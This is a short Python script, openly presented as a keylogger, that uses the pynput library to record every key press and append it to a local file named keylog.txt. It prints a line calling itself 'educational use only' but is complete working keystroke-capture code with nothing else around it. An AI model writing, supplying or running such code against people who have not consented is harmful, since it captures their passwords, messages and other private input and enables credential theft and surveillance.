from pynput.keyboard import Listener

def log_keystroke(key):
    with open("keylog.txt", "a") as file:
        try:
            file.write(f"{key.char}")
        except:
            file.write(f" [{key}] ")

print("Keylogger started... (Educational use only)")

with Listener(on_press=log_keystroke) as listener:
    listener.join()
